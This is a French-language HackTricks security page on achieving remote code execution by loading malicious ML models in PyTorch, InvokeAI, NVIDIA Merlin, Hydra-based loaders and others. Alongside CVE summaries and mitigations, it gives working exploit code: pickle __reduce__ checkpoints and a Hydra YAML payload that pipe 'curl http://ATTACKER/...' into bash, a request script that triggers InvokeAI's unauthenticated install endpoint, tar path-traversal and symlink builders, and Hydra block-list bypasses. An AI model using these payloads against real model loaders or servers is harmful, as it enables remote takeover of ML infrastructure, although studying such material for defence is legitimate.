# RCE des modèles

{{#include ../banners/hacktricks-training.md}}

## Chargement de modèles menant à une RCE

Les modèles de Machine Learning sont généralement partagés dans différents formats, tels que ONNX, TensorFlow, PyTorch, etc. Ces modèles peuvent être chargés sur les machines des développeurs ou dans des environnements de production pour être utilisés. Habituellement les modèles ne devraient pas contenir de code malveillant, mais il existe des cas où le modèle peut être utilisé pour exécuter du code arbitraire sur le système, soit comme fonctionnalité prévue, soit en raison d'une vulnérabilité dans la bibliothèque de chargement de modèles.

Au moment de la rédaction, voici quelques exemples de ce type de vulnérabilités :

| **Framework / Tool**        | **Vulnerability (CVE if available)**                                                    | **RCE Vector**                                                                                                                           | **References**                               |
|-----------------------------|------------------------------------------------------------------------------------------------------------------------------|------------------------------------------------------------------------------------------------------------------------------------------|----------------------------------------------|
| **PyTorch** (Python)        | *Insecure deserialization in* `torch.load` **(CVE-2025-32434)**                                                              | Un pickle malveillant dans un checkpoint de modèle entraîne l'exécution de code (contournant la protection `weights_only`)               | |
| PyTorch **TorchServe**      | *ShellTorch* – **CVE-2023-43654**, **CVE-2022-1471**                                                                         | SSRF + téléchargement de modèle malveillant provoque l'exécution de code ; désérialisation Java RCE dans l'API de gestion               | |
| **NVIDIA Merlin Transformers4Rec** | Unsafe checkpoint deserialization via `torch.load` **(CVE-2025-23298)**                                           | Un checkpoint non fiable déclenche le reducer de pickle lors de `load_model_trainer_states_from_checkpoint` → exécution de code dans le worker ML | [ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/) |
| **TensorFlow/Keras**        | **CVE-2021-37678** (unsafe YAML) <br> **CVE-2024-3660** (Keras Lambda)                                                      | Le chargement d'un modèle depuis YAML utilise `yaml.unsafe_load` (exécution de code) <br> Le chargement d'un modèle avec une couche **Lambda** exécute du code Python arbitraire | |
| TensorFlow (TFLite)         | **CVE-2022-23559** (TFLite parsing)                                                                                          | Un modèle `.tflite` spécialement conçu déclenche un débordement d'entier → corruption du tas (RCE potentiel)                            | |
| **Scikit-learn** (Python)   | **CVE-2020-13092** (joblib/pickle)                                                                                           | Le chargement d'un modèle via `joblib.load` exécute un pickle contenant la charge utile `__reduce__` de l'attaquant                      | |
| **NumPy** (Python)          | **CVE-2019-6446** (unsafe `np.load`) *disputed*                                                                              | `numpy.load` autorise par défaut des tableaux d'objets picklés – un `.npy/.npz` malveillant déclenche l'exécution de code                 | |
| **ONNX / ONNX Runtime**     | **CVE-2022-25882** (dir traversal) <br> **CVE-2024-5187** (tar traversal)                                                    | Le chemin des external-weights d'un modèle ONNX peut sortir du répertoire (lecture de fichiers arbitraires) <br> Un tar de modèle ONNX malveillant peut écraser des fichiers arbitraires (conduisant à une RCE) | |
| ONNX Runtime (design risk)  | *(No CVE)* ONNX custom ops / control flow                                                                                    | Un modèle avec un opérateur personnalisé nécessite le chargement de code natif de l'attaquant ; des graphes complexes peuvent abuser la logique pour exécuter des calculs non prévus | |
| **NVIDIA Triton Server**    | **CVE-2023-31036** (path traversal)                                                                                          | L'utilisation de l'API de chargement de modèle avec `--model-control` activé permet une traversal de chemin relative pour écrire des fichiers (par ex., écraser `.bashrc` pour obtenir une RCE) | |
| **GGML (GGUF format)**      | **CVE-2024-25664 … 25668** (multiple heap overflows)                                                                         | Un fichier de modèle GGUF malformé provoque des débordements de tampon sur le tas dans le parseur, permettant l'exécution de code arbitraire sur la machine victime | |
| **Keras (older formats)**   | *(No new CVE)* Legacy Keras H5 model                                                                                         | Un modèle HDF5 (`.h5`) malveillant avec du code dans une couche Lambda s'exécute toujours au chargement (Keras safe_mode ne couvre pas l'ancien format – “downgrade attack”) | |
| **Others** (general)        | *Design flaw* – Pickle serialization                                                                                         | Beaucoup d'outils ML (par ex., formats de modèle basés sur pickle, `pickle.load` en Python) exécuteront du code arbitraire incorporé dans les fichiers de modèle sauf si des mitigations sont en place | |
| **NeMo / uni2TS / FlexTok (Hydra)** | Untrusted metadata passed to `hydra.utils.instantiate()` **(CVE-2025-23304, CVE-2026-22584, FlexTok)** | Les métadonnées/configuration de modèle contrôlées par l'attaquant définissent `_target_` vers un callable arbitraire (par ex., `builtins.exec`) → exécuté lors du chargement, même pour des formats "sûrs" (`.safetensors`, `.nemo`, repo `config.json`) | [Unit42 2026](https://unit42.paloaltonetworks.com/rce-vulnerabilities-in-ai-python-libraries/) |

De plus, il existe certains modèles basés sur pickle en Python comme ceux utilisés par [PyTorch](https://github.com/pytorch/pytorch/security) qui peuvent être utilisés pour exécuter du code arbitraire sur le système s'ils ne sont pas chargés avec `weights_only=True`. Ainsi, tout modèle basé sur pickle peut être particulièrement vulnérable à ce type d'attaques, même s'il n'est pas listé dans le tableau ci‑dessus.

### Hydra metadata → RCE (fonctionne même avec safetensors)

`hydra.utils.instantiate()` importe et appelle tout `_target_` pointé par une chaîne dans un objet de configuration/métadonnées. Quand des bibliothèques fournissent des **métadonnées de modèle non fiables** à `instantiate()`, un attaquant peut fournir un callable et des arguments qui s'exécutent immédiatement lors du chargement du modèle (aucun pickle requis).

Payload example (works in `.nemo` `model_config.yaml`, repo `config.json`, or `__metadata__` inside `.safetensors`):
```yaml
_target_: builtins.exec
_args_:
- "import os; os.system('curl http://ATTACKER/x|bash')"
```
Points clés:
- Déclenché avant l'initialisation du modèle dans NeMo `restore_from/from_pretrained`, les codeurs uni2TS HuggingFace, et les loaders FlexTok.
- La string block-list de Hydra est contournable via des chemins d'import alternatifs (par ex., `enum.bltns.eval`) ou des noms résolus par l'application (par ex., `nemo.core.classes.common.os.system` → `posix`).
- FlexTok parse aussi les metadata sérialisées en chaîne avec `ast.literal_eval`, permettant un DoS (CPU/memory blowup) avant l'appel à Hydra.

### 🆕  InvokeAI RCE via `torch.load` (CVE-2024-12029)

`InvokeAI` est une interface web open-source populaire pour Stable-Diffusion. Les versions **5.3.1 – 5.4.2** exposent le endpoint REST `/api/v2/models/install` qui permet aux utilisateurs de télécharger et de charger des modèles depuis des URLs arbitraires.

En interne, l'endpoint appelle finalement :
```python
checkpoint = torch.load(path, map_location=torch.device("meta"))
```
Lorsque le fichier fourni est un **PyTorch checkpoint (`*.ckpt`)**, `torch.load` effectue une **pickle deserialization**. Parce que le contenu provient directement d'une URL contrôlée par l'utilisateur, un attaquant peut intégrer un objet malveillant avec une méthode personnalisée `__reduce__` à l'intérieur du checkpoint ; la méthode est exécutée **during deserialization**, entraînant **remote code execution (RCE)** sur le serveur InvokeAI.

La vulnérabilité a été référencée sous **CVE-2024-12029** (CVSS 9.8, EPSS 61.17 %).

#### Déroulé de l'exploitation

1. Créer un checkpoint malveillant:
```python
# payload_gen.py
import pickle, torch, os

class Payload:
def __reduce__(self):
return (os.system, ("/bin/bash -c 'curl http://ATTACKER/pwn.sh|bash'",))

with open("payload.ckpt", "wb") as f:
pickle.dump(Payload(), f)
```
2. Hébergez `payload.ckpt` sur un serveur HTTP que vous contrôlez (par ex. `http://ATTACKER/payload.ckpt`).
3. Déclenchez l'endpoint vulnérable (aucune authentification requise):
```python
import requests

requests.post(
"http://TARGET:9090/api/v2/models/install",
params={
"source": "http://ATTACKER/payload.ckpt",  # remote model URL
"inplace": "true",                         # write inside models dir
# the dangerous default is scan=false → no AV scan
},
json={},                                         # body can be empty
timeout=5,
)
```
4. When InvokeAI downloads the file it calls `torch.load()` → the `os.system` gadget runs and the attacker gains code execution in the context of the InvokeAI process.

Ready-made exploit: **Metasploit** module `exploit/linux/http/invokeai_rce_cve_2024_12029` automates the whole flow.

#### Conditions

•  InvokeAI 5.3.1-5.4.2 (paramètre scan par défaut **false**)  
•  `/api/v2/models/install` accessible par l'attaquant  
•  Le processus dispose des permissions pour exécuter des commandes shell

#### Atténuations

* Mettre à niveau vers **InvokeAI ≥ 5.4.3** – le correctif définit `scan=True` par défaut et effectue une analyse malware avant la désérialisation.  
* Lorsque vous chargez des checkpoints de façon programmatique, utilisez `torch.load(file, weights_only=True)` ou la nouvelle fonction d'aide [`torch.load_safe`](https://pytorch.org/docs/stable/serialization.html#security).  
* Appliquer des allow-lists / signatures pour les sources de modèles et exécuter le service selon le principe du moindre privilège.

> ⚠️ N'oubliez pas que **tout** format Python basé sur pickle (incluant de nombreux fichiers `.pt`, `.pkl`, `.ckpt`, `.pth`) est intrinsèquement dangereux à désérialiser depuis des sources non fiables.

---

Example of an ad-hoc mitigation if you must keep older InvokeAI versions running behind a reverse proxy:
```nginx
location /api/v2/models/install {
deny all;                       # block direct Internet access
allow 10.0.0.0/8;               # only internal CI network can call it
}
```
### 🆕 NVIDIA Merlin Transformers4Rec RCE via un `torch.load` non sécurisé (CVE-2025-23298)

Transformers4Rec de NVIDIA (partie de Merlin) exposait un loader de checkpoint non sécurisé qui appelait directement `torch.load()` sur des chemins fournis par l'utilisateur. Parce que `torch.load` s'appuie sur Python `pickle`, un checkpoint contrôlé par un attaquant peut exécuter du code arbitraire via un reducer pendant la désérialisation.

Chemin vulnérable (avant correctif) : `transformers4rec/torch/trainer/trainer.py` → `load_model_trainer_states_from_checkpoint(...)` → `torch.load(...)`.

Pourquoi cela mène à une RCE : dans Python `pickle`, un objet peut définir un reducer (`__reduce__`/`__setstate__`) qui retourne un callable et des arguments. Le callable est exécuté lors de la désérialisation. Si un tel objet est présent dans un checkpoint, il s'exécute avant que les poids ne soient utilisés.

Exemple minimal de checkpoint malveillant:
```python
import torch

class Evil:
def __reduce__(self):
import os
return (os.system, ("id > /tmp/pwned",))

# Place the object under a key guaranteed to be deserialized early
ckpt = {
"model_state_dict": Evil(),
"trainer_state": {"epoch": 10},
}

torch.save(ckpt, "malicious.ckpt")
```
Delivery vectors and blast radius:
- Checkpoints/modèles trojanisés partagés via des repos, buckets, ou des artifact registries
- Pipelines de reprise/déploiement automatisés qui chargent automatiquement les checkpoints
- L'exécution se produit à l'intérieur des training/inference workers, souvent avec des privilèges élevés (par ex., root dans des containers)

Fix: Commit [b7eaea5](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903) (PR #802) a remplacé le `torch.load()` direct par un désérialiseur restreint et allow-listé implémenté dans `transformers4rec/utils/serialization.py`. Le nouveau loader valide les types/champs et empêche l'invocation d'appels arbitraires pendant le chargement.

Defensive guidance specific to PyTorch checkpoints:
- Ne pas unpickle des données non fiables. Préférez des formats non-exécutables comme [Safetensors](https://huggingface.co/docs/safetensors/index) ou ONNX quand c'est possible.
- Si vous devez utiliser la sérialisation PyTorch, assurez-vous de `weights_only=True` (supporté dans les versions récentes de PyTorch) ou utilisez un unpickler custom allow-listé similaire au patch Transformers4Rec.
- Faire respecter la provenance/signatures des modèles et sandboxer la désérialisation (seccomp/AppArmor ; utilisateur non-root ; FS restreint et aucune sortie réseau).
- Surveiller la présence de processus enfants inattendus provenant des services ML au moment du chargement du checkpoint ; tracer l'utilisation de `torch.load()`/`pickle`.

POC and vulnerable/patch references:
- Vulnerable pre-patch loader: https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js
- Malicious checkpoint POC: https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js
- Post-patch loader: https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js

## Example – crafting a malicious PyTorch model

- Create the model:
```python
# attacker_payload.py
import torch
import os

class MaliciousPayload:
def __reduce__(self):
# This code will be executed when unpickled (e.g., on model.load_state_dict)
return (os.system, ("echo 'You have been hacked!' > /tmp/pwned.txt",))

# Create a fake model state dict with malicious content
malicious_state = {"fc.weight": MaliciousPayload()}

# Save the malicious state dict
torch.save(malicious_state, "malicious_state.pth")
```
- Charger le modèle:
```python
# victim_load.py
import torch
import torch.nn as nn

class MyModel(nn.Module):
def __init__(self):
super().__init__()
self.fc = nn.Linear(10, 1)

model = MyModel()

# ⚠️ This will trigger code execution from pickle inside the .pth file
model.load_state_dict(torch.load("malicious_state.pth", weights_only=False))

# /tmp/pwned.txt is created even if you get an error
```
### Désérialisation FaceDetection-DSFD de Tencent resnet (CVE-2025-13715 / ZDI-25-1183)

FaceDetection-DSFD de Tencent expose un endpoint `resnet` qui désérialise des données contrôlées par l'utilisateur. ZDI a confirmé qu'un attaquant distant peut contraindre une victime à charger une page/fichier malveillant, le faire pousser un blob sérialisé spécialement conçu vers cet endpoint, et déclencher la désérialisation en tant que `root`, entraînant une compromission totale.

Le déroulement de l'exploit reflète l'abus typique de pickle :
```python
import pickle, os, requests

class Payload:
def __reduce__(self):
return (os.system, ("curl https://attacker/p.sh | sh",))

blob = pickle.dumps(Payload())
requests.post("https://target/api/resnet", data=blob,
headers={"Content-Type": "application/octet-stream"})
```
Tout gadget accessible lors de la deserialization (constructors, `__setstate__`, framework callbacks, etc.) peut être weaponized de la même manière, que le transport soit HTTP, WebSocket, ou un fichier déposé dans un répertoire surveillé.


## Modèles vers Path Traversal

Comme commenté dans [**this blog post**](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties), la plupart des formats de modèles utilisés par différents AI frameworks sont basés sur des archives, généralement `.zip`. Par conséquent, il peut être possible d'abuser de ces formats pour effectuer des path traversal attacks, permettant de lire des fichiers arbitraires depuis le système où le modèle est chargé.

Par exemple, avec le code suivant vous pouvez créer un modèle qui créera un fichier dans le répertoire `/tmp` lors du chargement:
```python
import tarfile

def escape(member):
member.name = "../../tmp/hacked"     # break out of the extract dir
return member

with tarfile.open("traversal_demo.model", "w:gz") as tf:
tf.add("harmless.txt", filter=escape)
```
Ou, avec le code suivant, vous pouvez créer un modèle qui créera un symlink vers le répertoire `/tmp` lorsqu'il est chargé :
```python
import tarfile, pathlib

TARGET  = "/tmp"        # where the payload will land
PAYLOAD = "abc/hacked"

def link_it(member):
member.type, member.linkname = tarfile.SYMTYPE, TARGET
return member

with tarfile.open("symlink_demo.model", "w:gz") as tf:
tf.add(pathlib.Path(PAYLOAD).parent, filter=link_it)
tf.add(PAYLOAD)                      # rides the symlink
```
### Approfondissement : Keras .keras deserialization and gadget hunting

Pour un guide ciblé sur les internals de .keras, Lambda-layer RCE, le problème d'arbitrary import dans les versions ≤ 3.8, et la découverte de gadgets post-fix à l'intérieur de l'allowlist, voir:


{{#ref}}
../generic-methodologies-and-resources/python/keras-model-deserialization-rce-and-gadget-hunting.md
{{#endref}}

## Références

- [OffSec blog – "CVE-2024-12029 – InvokeAI Deserialization of Untrusted Data"](https://www.offsec.com/blog/cve-2024-12029/)
- [InvokeAI patch commit 756008d](https://github.com/invoke-ai/invokeai/commit/756008dc5899081c5aa51e5bd8f24c1b3975a59e)
- [Rapid7 Metasploit module documentation](https://www.rapid7.com/db/modules/exploit/linux/http/invokeai_rce_cve_2024_12029/)
- [PyTorch – security considerations for torch.load](https://pytorch.org/docs/stable/notes/serialization.html#security)
- [ZDI blog – CVE-2025-23298 Getting Remote Code Execution in NVIDIA Merlin](https://www.thezdi.com/blog/2025/9/23/cve-2025-23298-getting-remote-code-execution-in-nvidia-merlin)
- [ZDI advisory: ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/)
- [Transformers4Rec patch commit b7eaea5 (PR #802)](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903)
- [Pre-patch vulnerable loader (gist)](https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js)
- [Malicious checkpoint PoC (gist)](https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js)
- [Post-patch loader (gist)](https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js)
- [Hugging Face Transformers](https://github.com/huggingface/transformers)
- [Unit 42 – Remote Code Execution With Modern AI/ML Formats and Libraries](https://unit42.paloaltonetworks.com/rce-vulnerabilities-in-ai-python-libraries/)
- [Hydra instantiate docs](https://hydra.cc/docs/advanced/instantiate_objects/overview/)
- [Hydra block-list commit (warning about RCE)](https://github.com/facebookresearch/hydra/commit/4d30546745561adf4e92ad897edb2e340d5685f0)

{{#include ../banners/hacktricks-training.md}}
